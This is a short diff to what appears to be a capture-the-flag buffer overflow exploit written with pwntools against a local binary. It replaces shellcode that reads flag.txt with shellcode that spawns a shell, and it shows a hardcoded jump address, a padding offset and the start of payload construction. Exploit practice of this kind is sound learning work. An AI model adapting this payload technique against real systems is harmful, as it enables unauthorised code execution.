@@ -12,7 +12,9 @@ elf = pwn.ELF('./vuln')
 # cat address | grep ": jmp eax"
 new_eip = pwn.p32(0x0805333b)
 short_jump = b"\xeb\x08\x90\x90"
-shell_craft = pwn.asm(pwn.shellcraft.linux.cat("flag.txt"))
+#shell_craft = pwn.asm(pwn.shellcraft.linux.cat("flag.txt"))
+shell_craft = pwn.asm(pwn.shellcraft.linux.sh())
+
 offset = 24
 payload = b"".join([
         b"A"*offset,
